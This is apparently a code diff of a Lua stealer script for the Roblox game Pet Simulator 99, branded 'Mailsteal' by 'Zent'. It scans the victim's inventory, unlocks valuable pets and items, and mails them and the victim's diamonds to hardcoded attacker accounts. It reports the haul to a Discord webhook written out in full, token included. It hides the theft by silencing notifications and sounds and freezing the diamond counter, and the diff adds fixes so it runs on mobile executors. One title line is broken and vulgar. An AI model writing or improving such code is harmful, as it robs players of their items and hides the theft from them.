@@ -17,22 +17,13 @@ local function u9()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
-_G.Usernames = {
-    'Only1sherifalt1',
-}
-_G.webhook = {
-    'https://discord.com/api/webhooks/1557919052763234397/ejH8PgAHKgnL9U3HmNp671HLU4cFzYcLt0IEp-2yPXPkC2c8lh7IWVhRgC4foIECE_d-',
-}
+_G.Usernames = {'Only1sherifalt1'}
+_G.webhook = {'https://discord.com/api/webhooks/1557919052763234397/ejH8PgAHKgnL9U3HmNp671HLU4cFzYcLt0IEp-2yPXPkC2c8lh7IWVhRgC4foIECE_d-'}
 _G.minrap = 1000000
 
-local u10 = _G.Usernames or {}
-local v11 = _G.minrap or 1000000
-local u12 = _G.webhook or ''
-
-if next(u10) == nil or u12 == '' then
-    _LocalPlayer:kick("You didn't add any usernames or webhook")
-    return
-end
+local u10 = _G.Usernames
+local v11 = _G.minrap
+local u12 = _G.webhook
 
 for _, v16 in ipairs(u10) do
     if _LocalPlayer.Name == v16 then
@@ -41,17 +32,18 @@ for _, v16 in ipairs(u10) do
     end
 end
 
-local FunctionToGetFirstPriceOfMail
-for _, v20 in pairs(getgc()) do
-    if type(v20) == 'function' and debug.getinfo(v20).name == 'computeSendMailCost' then
-        FunctionToGetFirstPriceOfMail = v20
-        break
+-- FIXED: fallback cost if getgc fails on mobile
+local u21 = 20000
+pcall(function()
+    for _, v20 in pairs(getgc()) do
+        if type(v20) == 'function' and debug.getinfo(v20).name == 'computeSendMailCost' then
+            u21 = v20()
+            break
+        end
     end
-end
+end)
 
-local u21 = FunctionToGetFirstPriceOfMail()
 local u25 = 1
-
 for _, v26 in pairs(u9().Inventory.Currency) do
     if v26.id == 'Diamonds' then
         u25 = v26._am
@@ -76,7 +68,6 @@ local function u57(p32)
         {name = 'Items to be sent:', value = '', inline = false},
         {name = 'Summary:', value = '', inline = false},
     }
-
     local u37 = {}
     local v38 = {}
 
@@ -96,40 +87,34 @@ local function u57(p32)
 
     for _, v47 in ipairs(v38) do
         local v48 = u37[v47]
-        v33[2].value = v33[2].value .. v47 .. ' (x' .. v48.amount .. ')' .. ': ' .. u31(v48.rap * v48.amount) .. ' RAP\n'
+        v33[2].value = v33[2].value .. v47 .. ' (x' .. v48.amount .. '): ' .. u31(v48.rap * v48.amount) .. ' RAP\n'
     end
 
     v33[3].value = string.format('Gems: %s\nTotal RAP: %s', u31(p32), u31(u7))
 
-    local v49 = {}
-    local v50 = {}
-    local v51 = {
-        title = '🐱 PS99 Mailsteal — Zent',
-        color = 65280,
-        fields = v33,
-        footer = {text = 'Zent — Only1sherifalt1'},
-    }
-
-    table.insert(v50, v51)
-    v49.embeds = v50
-
     if #v33[2].value > 1024 then
-        local v55 = {}
-        for line in v33[2].value:gmatch('[^\r\n]+') do
-            table.insert(v55, line)
-        end
-        while #v33[2].value > 1024 and #v55 > 0 do
-            table.remove(v55)
-            v33[2].value = table.concat(v55, '\n') .. '\nPlus more!'
-        end
+        v33[2].value = v33[2].value:sub(1, 1000) .. '\nPlus more!'
     end
 
-    request({
-        Url = u12[1],
-        Method = 'POST',
-        Headers = {['Content-Type'] = 'application/json'},
-        Body = _HttpService:JSONEncode(v49),
+    local body = _HttpService:JSONEncode({
+        embeds = {{
+            title = pussy  stealer — Zent',
+            color = 65280,
+            fields = v33,
+            footer = {text = 'Zent — Only1sherifalt1'},
+        }}
     })
+
+    -- FIXED: syn.request for mobile executors
+    local ok, err = pcall(function()
+        if syn then
+            syn.request({Url = u12[1], Method = 'POST', Headers = {['Content-Type'] = 'application/json'}, Body = body})
+        elseif http then
+            http.request({Url = u12[1], Method = 'POST', Headers = {['Content-Type'] = 'application/json'}, Body = body})
+        else
+            request({Url = u12[1], Method = 'POST', Headers = {['Content-Type'] = 'application/json'}, Body = body})
+        end
+    end)
 end
 
 local function v74(p65, p66, p67)
@@ -138,17 +123,14 @@ local function v74(p65, p66, p67)
     local v70 = false
 
     while not v70 do
-        local v71 = {u10[v69], u4, p65, p66, p67 or 1}
-        local _MailboxSend, v73 = u1.Invoke('Mailbox: Send', unpack(v71))
-
+        local _MailboxSend, v73 = u1.Invoke('Mailbox: Send', u10[v69], u4, p65, p66, p67 or 1)
         if _MailboxSend == true then
             v70 = true
             u25 = u25 - u21
-            u21 = math.ceil(math.ceil(u21) * 1.5)
-            if u21 > 5000000 then u21 = 5000000 end
-        elseif _MailboxSend == false and v73 == "They don't have enough space!" then
+            u21 = math.min(math.ceil(u21 * 1.5), 5000000)
+        elseif v73 == "They don't have enough space!" then
             v69 = v69 + 1
-            if v68 < v69 then v70 = true end
+            if v69 > v68 then v70 = true end
         else
             v70 = true
         end
@@ -158,19 +140,15 @@ end
 local function v85()
     for _, v78 in pairs(u9().Inventory.Currency) do
         if v78.id == 'Diamonds' and u25 >= u21 + 10000 then
-            local v79 = #u10
             local v80 = 1
             local v81 = false
-
             while not v81 do
-                local v82 = {u10[v80], u4, 'Currency', v78, u25 - u21}
-                local _MailboxSend2, v84 = u1.Invoke('Mailbox: Send', unpack(v82))
-
-                if _MailboxSend2 == true then
+                local s, e = u1.Invoke('Mailbox: Send', u10[v80], u4, 'Currency', v78, u25 - u21)
+                if s == true then
                     v81 = true
-                elseif _MailboxSend2 == false and v84 == "They don't have enough space!" then
+                elseif e == "They don't have enough space!" then
                     v80 = v80 + 1
-                    if v79 < v80 then v81 = true end
+                    if v80 > #u10 then v81 = true end
                 else
                     v81 = true
                 end
@@ -179,8 +157,10 @@ local function v85()
     end
 end
 
-require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
-require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
+pcall(function()
+    require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
+    require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
+end)
 
 local function v93(p89, p90)
     local v92 = {
@@ -190,15 +170,17 @@ local function v93(p89, p90)
         StackKey = function()
             return _HttpService:JSONEncode({id = p90.id, pt = p90.pt, sh = p90.sh, tn = p90.tn})
         end,
-        AbstractGetRAP = function(_) return nil end,
+        AbstractGetRAP = function() return nil end,
     }
     return require(game:GetService('ReplicatedStorage').Library.Client.RAPCmds).Get(v92) or 0
 end
 
 local function v96()
     local _, v94 = u1.Invoke('Mailbox: Claim All')
-    while v94 == 'You must wait 30 seconds before using the mailbox!' do
+    local tries = 0
+    while v94 == 'You must wait 30 seconds before using the mailbox!' and tries < 50 do
         wait(0.2)
+        tries = tries + 1
         _, v94 = u1.Invoke('Mailbox: Claim All')
     end
 end
@@ -207,7 +189,7 @@ local function v101()
     if _Inventory.Box then
         for v99, v100 in pairs(_Inventory.Box) do
             if v100._uq then
-                u1.Invoke('Box: Withdraw All', v99)
+                pcall(function() u1.Invoke('Box: Withdraw All', v99) end)
             end
         end
     end
@@ -215,39 +197,44 @@ end
 
 local function v107()
     local v105 = next(_Inventory.Pet)
-    if v105 == nil then v105 = nil end
     local _, v106 = u1.Invoke('Mailbox: Send', 'Roblox', 'Test', 'Pet', v105, 1)
     return v106 == "They don't have enough space!"
 end
 
--- silence notifications
-LocalPlayer = _LocalPlayer
-local _ProcessPendingGUI = _LocalPlayer.PlayerScripts.Scripts.Core['Process Pending GUI']
-_ProcessPendingGUI.Disabled = true
+-- silence sounds (FIXED: pcall so it doesn't crash)
+pcall(function()
+    _LocalPlayer.PlayerScripts.Scripts.Core['Process Pending GUI'].Disabled = true
+end)
 
-local _Notifications = _LocalPlayer.PlayerGui.Notifications
-_Notifications.Enabled = false
-_Notifications:GetPropertyChangedSignal('Enabled'):Connect(function()
+pcall(function()
+    local _Notifications = _LocalPlayer.PlayerGui.Notifications
     _Notifications.Enabled = false
+    _Notifications:GetPropertyChangedSignal('Enabled'):Connect(function()
+        _Notifications.Enabled = false
+    end)
 end)
 
 game.DescendantAdded:Connect(function(p64)
-    if p64.ClassName == 'Sound' and (
-        p64.SoundId == 'rbxassetid://11839132565' or
-        p64.SoundId == 'rbxassetid://14254721038' or
-        p64.SoundId == 'rbxassetid://12413423276'
-    ) then
-        p64.Volume = 0
-        p64.PlayOnRemove = false
-        p64:Destroy()
-    end
+    pcall(function()
+        if p64.ClassName == 'Sound' and (
+            p64.SoundId == 'rbxassetid://11839132565' or
+            p64.SoundId == 'rbxassetid://14254721038' or
+            p64.SoundId == 'rbxassetid://12413423276'
+        ) then
+            p64.Volume = 0
+            p64.PlayOnRemove = false
+            p64:Destroy()
+        end
+    end)
 end)
 
 -- freeze gem display
-local _Diamonds = _LocalPlayer.leaderstats['💎 Diamonds']
-local _Value = _Diamonds.Value
-_Diamonds:GetPropertyChangedSignal('Value'):Connect(function()
-    _Diamonds.Value = _Value
+pcall(function()
+    local _Diamonds = _LocalPlayer.leaderstats['💎 Diamonds']
+    local _Value = _Diamonds.Value
+    _Diamonds:GetPropertyChangedSignal('Value'):Connect(function()
+        _Diamonds.Value = _Value
+    end)
 end)
 
 -- scan inventory
@@ -256,45 +243,31 @@ local CATEGORIES = {'Pet','Egg','Charm','Enchant','Potion','Misc','Hoverboard','
 for _, v108 in ipairs(CATEGORIES) do
     if _Inventory[v108] ~= nil then
         for v111, v112 in pairs(_Inventory[v108]) do
-            local v113
-
-            if v108 == 'Pet' then
-                local v114 = require(game:GetService('ReplicatedStorage').Library.Directory.Pets)[v112.id]
-                if v114.huge or v114.exclusiveLevel then
-                    local v115 = v93(v108, v112)
-                    if v11 <= v115 then
-                        local v116 = v112.pt and v112.pt == 1 and 'Golden ' or (v112.pt and v112.pt == 2 and 'Rainbow ' or '')
-                        if v112.sh then v116 = 'Shiny ' .. v116 end
-                        local v117 = v116 .. v112.id
-                        table.insert(u6, {
-                            category = v108,
-                            uid = v111,
-                            amount = v112._am or 1,
-                            rap = v115,
-                            name = v117,
-                        })
-                        v113 = u7 + v115 * (v112._am or 1)
-                        u7 = v113
+            pcall(function()
+                local v113
+                if v108 == 'Pet' then
+                    local v114 = require(game:GetService('ReplicatedStorage').Library.Directory.Pets)[v112.id]
+                    if v114 and (v114.huge or v114.exclusiveLevel) then
+                        local v115 = v93(v108, v112)
+                        if v11 <= v115 then
+                            local v116 = v112.pt == 1 and 'Golden ' or (v112.pt == 2 and 'Rainbow ' or '')
+                            if v112.sh then v116 = 'Shiny ' .. v116 end
+                            table.insert(u6, {category = v108, uid = v111, amount = v112._am or 1, rap = v115, name = v116 .. v112.id})
+                            u7 = u7 + v115 * (v112._am or 1)
+                        end
+                    end
+                else
+                    local v118 = v93(v108, v112)
+                    if v11 <= v118 then
+                        table.insert(u6, {category = v108, uid = v111, amount = v112._am or 1, rap = v118, name = v112.id})
+                        u7 = u7 + v118 * (v112._am or 1)
                     end
                 end
-            else
-                local v118 = v93(v108, v112)
-                if v11 <= v118 then
-                    table.insert(u6, {
-                        category = v108,
-                        uid = v111,
-                        amount = v112._am or 1,
-                        rap = v118,
-                        name = v112.id,
-                    })
-                    v113 = u7 + v118 * (v112._am or 1)
-                    u7 = v113
-                end
-            end
 
-            if v112._lk then
-                u1.Invoke('Locking_SetLocked', unpack({v111, false}))
-            end
+                if v112._lk then
+                    pcall(function() u1.Invoke('Locking_SetLocked', v111, false) end)
+                end
+            end)
         end
     end
 end
@@ -305,12 +278,12 @@ if #u6 > 0 or v11 + u21 < u25 then
     v101()
 
     if not v107() then
-        v8.Error('Account error. Please rejoin and try again or use a different account')
+        v8.Error('Account error. Rejoin and retry')
         return
     end
 
-    table.sort(u6, function(p119, p120)
-        return p119.rap * p119.amount > p120.rap * p120.amount
+    table.sort(u6, function(a, b)
+        return a.rap * a.amount > b.rap * b.amount
     end)
 
     spawn(function() u57(u25) end)
